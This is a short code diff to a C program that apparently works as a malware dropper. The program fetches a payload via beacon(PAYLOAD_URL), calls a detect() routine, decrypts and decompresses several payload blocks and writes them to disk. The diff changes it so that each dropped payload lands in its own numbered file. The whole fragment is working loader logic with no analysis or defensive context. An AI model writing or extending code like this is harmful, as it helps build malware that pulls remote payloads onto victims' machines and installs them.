@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <unistd.h>
+#include <string.h>
 #include <sys/mman.h>
 #include <sys/wait.h>
 #include "detect.h"
@@ -21,6 +22,8 @@ int main(int argc, char **argv)
     int d;                               //to hold the return value of detect()
     pid_t child;
     unsigned char *psswd;
+    int numFiles = 0;
+    char currFileName[strlen(PATH_TO_WRITE) + 5];
 
     payload = beacon(PAYLOAD_URL);
     payloadOffset = payload.memory; // hold for iteration
@@ -97,7 +100,9 @@ int main(int argc, char **argv)
         }
         else
         {
-            writeToDisk(decompressed, PATH_TO_WRITE, payloadMeta[i].uncompressedLength);
+            sprintf(currFileName, "%s%d", PATH_TO_WRITE, numFiles);
+            writeToDisk(decompressed, currFileName, payloadMeta[i].uncompressedLength);
+            numFiles++;
         }
         free(decompressed);
         payloadOffset += payloadMeta[i].encryptedLength; // increment offset to point at next payload
